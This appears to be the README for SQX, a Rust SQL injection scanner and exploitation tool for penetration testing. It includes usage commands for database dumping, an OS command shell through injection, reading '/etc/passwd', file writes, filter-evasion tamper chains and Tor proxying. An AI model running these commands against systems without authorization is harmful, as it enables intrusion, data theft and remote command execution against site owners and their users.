# SQX — SQL Injection Scanner

> **Fast. Smart. Comprehensive.**
>
> A modern SQL injection detection and exploitation tool written in Rust.

[![Rust](https://img.shields.io/badge/rust-%23000000.svg?style=for-the-badge&logo=rust&logoColor=white)](https://www.rust-lang.org/)
[![License](https://img.shields.io/badge/license-MIT%2FApache--2.0-blue.svg)](LICENSE)

## Overview

SQX is a powerful SQL injection scanner that combines speed, intelligence, and comprehensive detection capabilities. Built with async Rust, it outperforms traditional Python-based tools while maintaining ease of use.

### Why SQX?

- **🚀 Fast**: Async Rust engine with concurrent request handling
- **🧠 Smart**: AI-powered payload suggestions (local Ollama + optional cloud providers)
- **🛡️ Evasive**: 69 built-in tamper scripts (more than sqlmap's ~40)
- **🔧 Complete**: Detection, exploitation, and data extraction in one tool
- **📊 Integrated**: SARIF output for GitHub Advanced Security
- **💯 Free**: Open source, no restrictions

## Installation

### Prerequisites

- **Rust** 1.85+ ([Install Rust](https://rustup.rs/))
- **OpenSSL** development libraries (for TLS support)
  - Debian/Ubuntu: `sudo apt install libssl-dev pkg-config`
  - macOS: `brew install openssl pkg-config`
  - Windows: Install via [vcpkg](https://vcpkg.io/) or use prebuilt binaries

### Build from Source

```bash
# Clone the repository
git clone https://github.com/fatuvirgil/sqx.git
cd sqx

# Build release binary (optimized)
cargo build --release

# Binary will be at:
# Linux/macOS: ./target/release/sqx
# Windows: .\target\release\sqx.exe
```

### Platform Support

| Platform | Status | Notes |
|----------|--------|-------|
| Linux x86_64 | ✅ Tested | Primary development platform |
| macOS x86_64/ARM64 | ⚠️ Not tested | Should work (Rust cross-platform) |
| Windows x86_64 | ⚠️ Not tested | Should work (Rust cross-platform) |

**Contributions welcome!** If you test on macOS/Windows, please open an issue with your results.

### Docker (for testing)

```bash
# Run sqli-labs for local testing
docker run -d -p 8080:80 --name sqli-labs acgpiano/sqli-labs:latest

# Then test SQX
./target/release/sqx scan "http://localhost:8080/Less-1/?id=1"
```

## Quick Start

```bash
# Install from source
git clone https://github.com/fatuvirgil/sqx.git
cd sqx
cargo build --release

# Run a basic scan
./target/release/sqx scan "http://target.com/page.php?id=1"

# Smart scan with AI assistance
./target/release/sqx scan "http://target.com/page.php?id=1" --smart --ai-advisor

# Full auto crawl + scan
./target/release/sqx auto "http://target.com/" --smart --max-pages 100
```

## Features

### Detection Techniques

| Technique | Description |
|-----------|-------------|
| **Error-based** | Extract information from database error messages |
| **Boolean Blind** | TRUE/FALSE inference with automatic calibration |
| **Time-based Blind** | Delay-based detection with adaptive timing |
| **UNION-based** | ORDER BY discovery and column enumeration |
| **Stacked Queries** | Multi-statement injection detection |
| **Header Injection** | X-Forwarded-For, User-Agent, Referer, Cookie testing |

### Evasion (69 Tamper Scripts)

```bash
# List all available tampers
sqx tampers

# Use multiple tampers in chain
sqx scan "http://target.com/page.php?id=1" --tamper space_to_comment,randomcase,urlencode
```

Categories:
- **Encoding**: urlencode, base64, hex, unicode escape
- **Space Substitution**: comments, tabs, newlines
- **Keyword Obfuscation**: randomcase, versioned comments
- **MySQL Specific**: 13 specialized bypasses
- **Quote Bypass**: Apostrophe masking and encoding

### Interactive Shells

```bash
# SQL Shell - execute queries directly
sqx sql-shell "http://target.com/page.php?id=1" --param id --dbms mysql
SQL> SELECT version()
SQL> .tables
SQL> .dump users

# OS Shell - command execution via SQL injection
sqx os-shell "http://target.com/page.php?id=1" --param id --dbms mysql
OS> whoami
OS> ls -la
```

### Data Extraction

```bash
# Full database dump
sqx dump "http://target.com/page.php?id=1" --param id --dbms mysql --technique boolean

# Read specific file
sqx file-read "http://target.com/page.php?id=1" --param id --file "/etc/passwd"

# Custom SQL query
sqx sql "http://target.com/page.php?id=1" --param id --query "SELECT user()"
```

### Batch Scanning

```bash
# Scan multiple targets
sqx batch targets.txt --concurrency 5 --smart

# Output formats
sqx scan "http://target.com/?id=1" --output json --out-file results.json
sqx scan "http://target.com/?id=1" --output sarif --out-file results.sarif
```

## Architecture

```
sqx/
├── sqx-core/    # Detection engine library
└── sqx-cli/     # CLI binary
```

## Commands

```
sqx scan       Scan a GET URL for SQL injection
sqx post       Scan a POST endpoint
sqx auto       Spider → fingerprint → scan all injection points
sqx dump       Extract full database from vulnerable endpoint
sqx batch      Multi-target scanning
sqx sql-shell  Interactive SQL shell
sqx os-shell   Interactive OS command shell
sqx file-read  Read remote files via SQL injection
sqx file-write Write files via SQL injection
sqx sql        Execute custom SQL query
sqx tampers    List available tamper scripts
sqx validate   Validate SQL payload syntax
sqx intel      Collect target intelligence (CVEs, assets)
sqx bench      Run detection benchmark
sqx replay     Replay request from file
```

## AI Integration

### Local (Default - Free)
```bash
# Requires Ollama running locally
sqx scan "http://target.com/?id=1" --ai-advisor --ai-model ollama:llama3.2
```

### Cloud (Your API Key)
```bash
# Claude (requires --ai-consent for data sharing)
sqx scan "http://target.com/?id=1" --ai-advisor \
  --ai-model claude:claude-sonnet-4-5 \
  --ai-api-key YOUR_KEY \
  --ai-consent

# OpenAI / OpenAI-compatible
sqx scan "http://target.com/?id=1" --ai-advisor \
  --ai-model openai:gpt-4o \
  --ai-api-key YOUR_KEY \
  --ai-consent
```

## Session Management

```bash
# Basic cookie
sqx scan "http://target.com/?id=1" --cookie "PHPSESSID=abc123; role=admin"

# Auto-detect cookies from response
sqx scan "http://target.com/?id=1" --cookie-auto-detect

# Form-based authentication
sqx scan "http://target.com/?id=1" \
  --login-url "http://target.com/login" \
  --auth-method form \
  --auth-cred username=admin \
  --auth-cred password=secret \
  --auth-success "dashboard"

# Bearer token
sqx scan "http://target.com/api/users?id=1" \
  --auth-token "eyJhbGciOiJIUzI1NiIs..."
```

## Proxy Support

```bash
# HTTP proxy
sqx scan "http://target.com/?id=1" --proxy http://127.0.0.1:8080

# SOCKS5 proxy (e.g., Tor)
sqx scan "http://target.com/?id=1" --proxy socks5://127.0.0.1:9050
```

## Output Formats

| Format | Use Case |
|--------|----------|
| `text` | Human-readable console output (default) |
| `json` | Structured data for scripting |
| `sarif` | GitHub Advanced Security integration |

```bash
# GitHub Advanced Security
sqx scan "http://target.com/?id=1" --output sarif --out-file results.sarif
# Upload results.sarif to GitHub Security tab
```

## Security & Ethics

**⚠️ WARNING: For Authorized Testing Only**

- Only use on systems you own or have explicit written permission to test
- Unauthorized access is illegal and unethical
- Users are responsible for complying with applicable laws

## License

SQX is dual-licensed under:
- MIT License
- Apache License 2.0

See [LICENSE-MIT](LICENSE-MIT) and [LICENSE-APACHE](LICENSE-APACHE) for details.

## Contributing

We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

## Acknowledgments

- Inspired by [sqlmap](https://sqlmap.org/) - the original SQL injection tool
- Built with [Rust](https://www.rust-lang.org/) and [Tokio](https://tokio.rs/)

---

**Intelexia Team**
